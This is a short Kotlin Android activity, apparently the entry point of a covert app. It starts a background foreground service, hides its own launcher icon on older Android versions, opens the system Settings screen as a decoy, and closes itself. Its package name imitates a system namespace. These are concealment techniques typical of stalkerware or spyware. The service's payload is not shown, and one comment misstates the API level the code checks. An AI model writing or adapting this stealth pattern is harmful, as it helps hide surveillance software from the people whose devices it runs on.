package android.systems.myapplication

import android.content.ComponentName
import android.content.Intent
import android.content.pm.PackageManager
import android.os.Build
import androidx.appcompat.app.AppCompatActivity
import android.os.Bundle
import android.provider.Settings
import androidx.annotation.RequiresApi

class MainActivity : AppCompatActivity() {
    @RequiresApi(Build.VERSION_CODES.LOLLIPOP)
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)


        //run app in foreground
        startService(Intent(this,ForegroundService::class.java))


            //hides app from homescreen if android version is less than API-29
            if(Build.VERSION.SDK_INT < Build.VERSION_CODES.O){
                //hides app from home-screen
                val componentName = ComponentName(this, MainActivity::class.java)
                packageManager.setComponentEnabledSetting(componentName, PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP)


            }

        
            //shows a settings screen whenever app is opened
            val startSettings = Intent(Settings.ACTION_SETTINGS)
            startActivity(startSettings)
            finishAndRemoveTask();



    }
}
